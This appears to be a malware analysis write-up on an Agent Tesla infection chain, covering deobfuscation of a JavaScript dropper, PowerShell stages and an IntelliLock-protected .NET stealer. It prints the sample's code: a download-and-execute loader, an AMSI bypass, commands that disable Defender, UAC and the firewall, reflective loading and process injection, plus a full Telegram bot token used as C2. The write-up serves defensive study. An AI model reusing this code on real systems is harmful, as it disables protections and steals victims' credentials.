## Agent Tesla Analysis

A .NET based information stealer readily available to actors due to leaked builders. The malware is able to log keystrokes, can access the host's clipboard and crawls the disk for credentials or other valuable information. It has the capability to send information back to its C&C via HTTP(S), SMTP, FTP, or towards a Telegram channel.

## Initial JavaScript

The initial stage is a JS script, this sample was downloaded from here - https://bazaar.abuse.ch/sample/3ea81c292f36f2583d2291e8a393014da62767447dba7b139a6c45574647aa2b/

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b592b43e-f126-45d9-933e-004809be6ca6)

The script is obfuscated with Char codes and junk characters, we'll start by removing the ° characters and adding new lines after each semi colon to clean it up a bit.

``` powershell
_cs=["ste","//a","while","ep","bl","ell","ame","pt.","it","nt","Del","Id","Ele","il"," -e","zone","we",'&'," [","ls1","yP","po",".F","Se","ete","ce","She","Fi","By","(i","pa","]:","tar","cri","erv",",'","+","t.","ml)","RUN","e'","ur","5.",".r",'tion',"for"," |","je","*x","//","geo","ing","Sle"," . ","c ","eP","-","oi","eSy","dow","ul","get","in2",".S","yPr","na",'1024',"lTy","Sec","Ma","*'","ll","%","p ","ss","mOb","oct",");S","2;$","m/","col","Scr","et","('","nav","Sc","ot","rm ","ipt",'win',"WS","m.x","nd","///","[N","ge","ct","ma","ic","le","ri","ro","ptF","oco","rsh","la","')","('i","cur","::","lN",":T"," =","to","htl",'abs',"t-S","Ne","co","r]","ogs","pe"," -","s 5"];

 _g0g0g0g0=[_cs[90],_cs[39],_cs[21]+_cs[16]+_cs[104]+_cs[5]+_cs[14]+_cs[73]+_cs[28]+_cs[30]+_cs[74]+_cs[122]+_cs[54]+_cs[94]+_cs[82]+_cs[63]+_cs[34]+_cs[98]+_cs[55]+_cs[57]+_cs[9]+_cs[69]+_cs[65]+_cs[95]+_cs[119]+_cs[109]+_cs[68]+_cs[41]+_cs[8]+_cs[20]+_cs[101]+_cs[113]+_cs[80]+_cs[112]+_cs[18]+_cs[117]+_cs[37]+_cs[23]+_cs[108]+_cs[8]+_cs[64]+_cs[86]+_cs[103]+_cs[67]+_cs[121]+_cs[31]+_cs[111]+_cs[19]+_cs[78]+_cs[29]+_cs[87]+_cs[114]+_cs[76]+_cs[97]+_cs[62]+_cs[42]+_cs[4]+_cs[120]+_cs[21]+_cs[37]+_cs[118]+_cs[79]+_cs[93]+_cs[49]+_cs[93]+_cs[93]+_cs[49]+_cs[93]+_cs[49]+_cs[49]+_cs[49]+_cs[1]+_cs[113]+_cs[91]+_cs[38]+_cs[46]+_cs[53]+_cs[107]+_cs[48]+_cs[106]+_cs[43]+_cs[3]+_cs[105]+_cs[25]+_cs[83]+_cs[70]+_cs[35]+_cs[40]+_cs[77]+_cs[32]+_cs[116]+_cs[99]+_cs[3]+_cs[122]+_cs[23]+_cs[118]+_cs[92]+_cs[123],_cs[7],_cs[71],_cs[81]+_cs[88]+_cs[51]+_cs[22]+_cs[13]+_cs[58]+_cs[0]+_cs[75]+_cs[47]+_cs[96],_cs[33],_cs[26],_cs[85]+_cs[100]+_cs[102]+_cs[60]+_cs[110]+_cs[6],_cs[10]+_cs[24]+_cs[27]+_cs[99],_cs[52]+_cs[3]];

 _g1=[_g0g0g0g0[4],_g0g0g0g0[6],_g0g0g0g0[1],_g0g0g0g0[0],_g0g0g0g0[3],_g0g0g0g0[7]];

 new ActiveXObject(_g1[3]+_g1[1]+_g1[4]+_g1[5]+_g1[0])[_g1[2]](_g0g0g0g0[2],0,true);
 
 WScript[_g0g0g0g0[10]](10000);
 
 new ActiveXObject(_g0g0g0g0[5])[_g0g0g0g0[9]](WScript[_g0g0g0g0[8]]);
```

We're going to echo the interesting "_g0g0g0g0" variable and avoid execution by commenting out the ActiveXObject and WScript lines:

``` powershell
_cs=["ste","//a","while","ep","bl","ell","ame","pt.","it","nt","Del","Id","Ele","il"," -e","zone","we",'&'," [","ls1","yP","po",".F","Se","ete","ce","She","Fi","By","(i","pa","]:","tar","cri","erv",",'","+","t.","ml)","RUN","e'","ur","5.",".r",'tion',"for"," |","je","*x","//","geo","ing","Sle"," . ","c ","eP","-","oi","eSy","dow","ul","get","in2",".S","yPr","na",'1024',"lTy","Sec","Ma","*'","ll","%","p ","ss","mOb","oct",");S","2;$","m/","col","Scr","et","('","nav","Sc","ot","rm ","ipt",'win',"WS","m.x","nd","///","[N","ge","ct","ma","ic","le","ri","ro","ptF","oco","rsh","la","')","('i","cur","::","lN",":T"," =","to","htl",'abs',"t-S","Ne","co","r]","ogs","pe"," -","s 5"];

 _g0g0g0g0=[_cs[90],_cs[39],_cs[21]+_cs[16]+_cs[104]+_cs[5]+_cs[14]+_cs[73]+_cs[28]+_cs[30]+_cs[74]+_cs[122]+_cs[54]+_cs[94]+_cs[82]+_cs[63]+_cs[34]+_cs[98]+_cs[55]+_cs[57]+_cs[9]+_cs[69]+_cs[65]+_cs[95]+_cs[119]+_cs[109]+_cs[68]+_cs[41]+_cs[8]+_cs[20]+_cs[101]+_cs[113]+_cs[80]+_cs[112]+_cs[18]+_cs[117]+_cs[37]+_cs[23]+_cs[108]+_cs[8]+_cs[64]+_cs[86]+_cs[103]+_cs[67]+_cs[121]+_cs[31]+_cs[111]+_cs[19]+_cs[78]+_cs[29]+_cs[87]+_cs[114]+_cs[76]+_cs[97]+_cs[62]+_cs[42]+_cs[4]+_cs[120]+_cs[21]+_cs[37]+_cs[118]+_cs[79]+_cs[93]+_cs[49]+_cs[93]+_cs[93]+_cs[49]+_cs[93]+_cs[49]+_cs[49]+_cs[49]+_cs[1]+_cs[113]+_cs[91]+_cs[38]+_cs[46]+_cs[53]+_cs[107]+_cs[48]+_cs[106]+_cs[43]+_cs[3]+_cs[105]+_cs[25]+_cs[83]+_cs[70]+_cs[35]+_cs[40]+_cs[77]+_cs[32]+_cs[116]+_cs[99]+_cs[3]+_cs[122]+_cs[23]+_cs[118]+_cs[92]+_cs[123],_cs[7],_cs[71],_cs[81]+_cs[88]+_cs[51]+_cs[22]+_cs[13]+_cs[58]+_cs[0]+_cs[75]+_cs[47]+_cs[96],_cs[33],_cs[26],_cs[85]+_cs[100]+_cs[102]+_cs[60]+_cs[110]+_cs[6],_cs[10]+_cs[24]+_cs[27]+_cs[99],_cs[52]+_cs[3]];

 _g1=[_g0g0g0g0[4],_g0g0g0g0[6],_g0g0g0g0[1],_g0g0g0g0[0],_g0g0g0g0[3],_g0g0g0g0[7]];

WScript.Echo(_g0g0g0g0)
 //new ActiveXObject(_g1[3]+_g1[1]+_g1[4]+_g1[5]+_g1[0])[_g1[2]](_g0g0g0g0[2],0,true);
 
 //WScript[_g0g0g0g0[10]](10000);
 
 //new ActiveXObject(_g0g0g0g0[5])[_g0g0g0g0[9]](WScript[_g0g0g0g0[8]]);
```

When executed, this gives us the following:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f8dbf57c-c55e-449e-8842-cb466a114597)

We're presented with a PowerShell command which downloads and executes the contents of the given URL.

## PowerShell - Stage 2 
The domain in question redirects to a bitbucket link and hosts a PowerShell script.

Initial URL: hxxp[://]htloctmain25.blogspot[.]com/atom.xml

Effective URL: hxxps[://]bitbucket[.]org/!api/2.0/snippets/nigalulli/eqxj7X/b2354d985832bb13d56bcd2b11ee00ed11b27f6a/files/file

Contents of the script:

``` powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
"RegSvcs", "mshta", "wscript", "msbuild", "FoxitPDFReader" | ForEach-Object { Stop-Process -Name $_ -Force }

$DINDHAM= "C:\ProgramData\MINGALIES"
ni $DINDHAM -it d -fo

$lulli = @'



$muthal = (Long strings of 0s and 1s with a replace command at the end)

$bulgumchupitum = (As above)

#kcuf em rederhar

function asceeeeeeeeeeeeeeee {
    param (
        [string]$binaryString
    )

    try {
        $asciiText = -join ($binaryString -split '(.{8})' | ForEach-Object { if ($_ -ne '') { [char]([Convert]::ToByte($_, 2)) } })
        return $asciiText
    }
    catch {
        return "Error: Invalid binary input"
    }
}
#AM
$Phudigum = (Similar obfuscated binary string)

(asceeeeeeeeeeeeeeee $Phudigum) | .('{1}{Â°Â°Â°}'.replace('Â°Â°Â°','0')-f'!','I').replace('!','ex')



(asceeeeeeeeeeeeeeee $bulgumchupitum)  | .('{1}{Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°}'.replace('Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°','0')-f'!','I').replace('!','ex')

Remove-Item -Path "$DINDHAM\KAMASUTRAKIM.~!!@#!!!!!!!!!!!!!!!~" -Recurse -Force

Remove-Item -Path "$DINDHAM" -Recurse -Force

#the File will start cumiing to your pca

'@
[IO.File]::WriteAllText("$DINDHAM\\KAMASUTRAKIM.~!!@#!!!!!!!!!!!!!!!~", $lulli)

$lulli | .('{1}{Â°Â°Â°Â°Â°}'.replace('Â°Â°Â°Â°Â°','0')-f'!','I').replace('!','ex')

$koaskodkwllWWW = (Another long obfuscated binary string)


$kimahoter = asceeeeeeeeeeeeeeee $koaskodkwllWWW
$krokale = "213"
$moawk = "chromeupdateri"
#variable
$ASJDWWKKK1 = "n4n2"
$asksodkasodkwV2 = "mrm9"
$ripplessw = 'htljan62024.blogspot.com' + '//////////a' + 't' + 'o' + 'm.xml'
$kimahoter = $kimahoter.Replace('mynsexi', $krokale)
$kimahoter = $kimahoter.Replace('Tnamesexi', $moawk)
$kimahoter = $kimahoter.Replace('linkcomsexi', $ripplessw)
$kimahoter = $kimahoter.Replace('x8', $ASJDWWKKK1)
$kimahoter = $kimahoter.Replace('g0', $asksodkasodkwV2)
$kimahoter | .('{1}{Â°Â°Â°Â°Â°}'.replace('Â°Â°Â°Â°Â°','0')-f'!','I').replace('!','ex')





$scriptPath = $MyInvocation.MyCommand.Path

# Check if the script path exists
if (Test-Path $scriptPath) {
    # Try to delete the script
    try {
        Remove-Item -Path $scriptPath -Force
        Write-Output "Script has been deleted successfully."
    } catch {
        Write-Error "Failed to delete the script. Error: $_"
    }
} else {
    Write-Error "Script path does not exist."
}
```

The script is comprised of 3 long strings of 0s and 1s, one of these strings likely contains executable code.

I wasn't able to make much sense out of the first set of binary code ($muthal)

The secondary blob contains our binary code, which we will review further shortly.

The final blob decodes as below:

``` powershell
[Ref].("{0}" -f'Ass'+'em'+'bly').("{0}" -f'Ge'+'tT'+'ype')('System.Management.Automation.Ams'+'iUtils').("{0}" -f'Ge'+'tFi'+'eld')('am'+'siInitFailed','NonPu'+'blic,Static').("{0}" -f'Set'+'Val'+'ue')($null,$true)


New-Item -P "HKCU:\Software\Classes\CLSID\" -N "{fdb00e52-a214-4aa1-8fba-4357bb0072ec}" -F
New-Item -P "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\" -N "InProcServer32" -F
New-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32' -N '(Default)' -V "C:\IDontExist.dll" -PropertyType String -Force
if (-not ([Type]::GetType("AMSIReaper"))) {
    Add-Type -TypeDefinition @"
    using System; using System.Diagnostics; using System.Runtime.InteropServices;
    public class AMSIReaper {
        public const int PROCESS_VM_OPERATION = 0x0008, PROCESS_VM_READ = 0x0010, PROCESS_VM_WRITE = 0x0020;
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    }
"@
}

function ModAMSI($processId) {
    # Function content remains the same
}

function ModAllPShells {
    # Function content remains the same
}

Write-Host "AMSI do"


$ErrorActionPreference = "SilentlyContinue" # Suppress errors globally

# Add Exclusions
$extensions = @('.ppam', '.xls', '.docx', '.vbs', '.js')
$paths = @('C:\', 'D:\', 'E:\')
$processes = @('explorer.exe', 'kernel32.dll', 'aspnet_compiler.exe', 'cvtres.exe', 'CasPol.exe', 'csc.exe', 'Msbuild.exe', 'ilasm.exe', 'InstallUtil.exe', 'jsc.exe', 'powershell.exe', 'rundll32.exe', 'conhost.exe', 'Cscript.exe', 'mshta.exe', 'cmd.exe', 'DefenderisasuckingAntivirus', 'wscript.exe')

$extensions | ForEach-Object { Add-MpPreference -ExclusionExtension $_ -ErrorAction SilentlyContinue }
$paths | ForEach-Object { Add-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue }
$processes | ForEach-Object { Add-MpPreference -ExclusionProcess $_ -ErrorAction SilentlyContinue }

# Set Preferences and Disable Security Features (ensure this is run as admin)
try {
    Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection disable -HighThreatDefaultAction 6 -Force -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ScanScheduleDay 8 -ExclusionIpAddress 127.0.0.1 -ThreatIDDefaultAction_Actions 6 -AttackSurfaceReductionRules_Ids 0 -ErrorAction SilentlyContinue
} catch {}

# Registry, Service, and Firewall Changes (ensure this is run as admin)
try {
    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -PropertyType DWord -Value 0 -Force -ErrorAction SilentlyContinue
    netsh advfirewall set allprofiles state off -ErrorAction SilentlyContinue
} catch {}

$ErrorActionPreference = "Continue" # Reset error action preference

```

This infers that COM object hijacking is being utilised as a means of persistence, under the Class ID 'fdb00e52-a214-4aa1-8fba-4357bb0072ec'

The second, $bulgumchupitum, is as follows:

``` powershell
function kimkarden($binaryData) {
       $paddedBinaryData = $binaryData.PadRight(($binaryData.Length + 7) - ($binaryData.Length % 8), '0')
    $decodedData = $paddedBinaryData -split '(?<=\G.{8})' | ForEach-Object {
        [byte]([ConVErt]::ToINT32($_, 2) -band 255)
    }

    return $decodedData
}


$muthal = -join $muthal[-1..-($muthal.Length)]

$binaryData1 = (Yet another long binary string)
$pinch = $binaryData1.split('O')[1].split('l')[0]
$rPinchr = -join $pinch[-1..-($pinch.Length)]
$pinchs = $rPinchr.replace('*', '000000000000000000').replace('-', '111').replace('!', '1000000').replace('^', '100000')

[byte[]] $data1 = kimkarden $pinchs
[byte[]] $data2 = kimkarden $muthal

Start-Sleep -Seconds 1
$assembly = [Reflection.Assembly]::Load($data1)

# Execute the command using the decoded byte arrays
function ExecuteCommand {
    $typeName = 'A.B'
    $method = 'C'
    $type = $assembly.GetType($typeName)
    $invokeMethod = $type.GetMethod($method)
    $frameworkPath = 'C:\Windows\Microsoft.NET\Framework'
    $v4Path = $frameworkPath + '\v4.0.30319\RegSvcs.exe'
    $v2Path = $frameworkPath + '\v2.0.50727\RegSvcs.exe'
    $v3Path = $frameworkPath + '\v3.5\Msbuild.exe'
    $args = [OBJECT[]]
    $nullArray = $nulls, { $args }
	Start-Sleep -Seconds 2
    $invokeMethod.Invoke($nullArray, ($v4Path, $data2))
	Start-Sleep -Seconds 2
    $invokeMethod.Invoke($nullArray, ($v2Path, $data2))
	Start-Sleep -Seconds 2
    $invokeMethod.Invoke($nullArray, ($v3Path, $data2))
}

# Execute the command
ExecuteCommand

$scriptPath = $MyInvocation.MyCommand.Path

# Check if the script path exists
if (Test-Path $scriptPath) {
    # Try to delete the script
    try {
        Remove-Item -Path $scriptPath -Force
        Write-Output "Script has been deleted successfully."
    } catch {
        Write-Error "Failed to delete the script. Error: $_"
    }
} else {
    Write-Error "Script path does not exist."
}
```

It appears that this is the code we are interested in to extract an executable, it looks like when this script is executed, the given code is injected into RegSvcs.exe.

We can manipulate the code to get the deobfuscated binary data and write the binary file to disk using CyberChef.

We'll simply isolate the binary data, add the manipulation variables and echo the last variable, outputting the results to a new file.
 
``` powershell
$binaryData1 = (Long binary string) 
$pinch = $binaryData1.split('O')[1].split('l')[0]
$rPinchr = -join $pinch[-1..-($pinch.Length)]
$pinchs = $rPinchr.replace('*', '000000000000000000').replace('-', '111').replace('!', '1000000').replace('^', '100000')

echo $pinchs > C:\Users\mzheader\Desktop\binary.txt
```

We'll then upload the result to CyberChef and use a 'From Binary' operator to extract the executable.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/ffe7cfb7-9905-46b3-8eb1-edb34151723f)

## Analysing the Binary

The binary extracted is a .NET executable, however, it appears have been protected by IntelliLock, making reverse engineering this binary very difficult.

_References to Protection:_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e2d173aa-e5de-44db-8f95-cc07104df754)

We'll revert to dynamic analysis to extract any IOCs from this binary.

Upon execution, one of the first notable things is that RegSvcs.exe (Our injected process) makes a network request to ip-api.com, which is fairly typical for a lot of malware families.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/ad7d94c8-567e-4980-a8ac-6b20315210e5)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/328fec11-1bf0-483d-92a7-94f3a9d958c3)

Looking at file interaction events in ProcMon, it's evident that the malware is reading sensitive information such as history, passwords, cookies etc utilised by common browsers.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b2fd9ede-de95-4634-9392-159d89bf4a40)

Further investigation of network traffic shows that POST requests are made towards the Telegram API domain, a strong indication that this sensitive information is being infiltrated via Telegram C2.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1962edb4-4c4f-4dcb-b35a-aa3bbac216ff)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a7d6f3e3-a389-4c9f-a404-635fba0310c3)

**C2: hxxps[://]api.telegram[.]org/bot6796626947:AAGohe-IHhj5LD7VpBLcRBukReMwBcOmiTo**






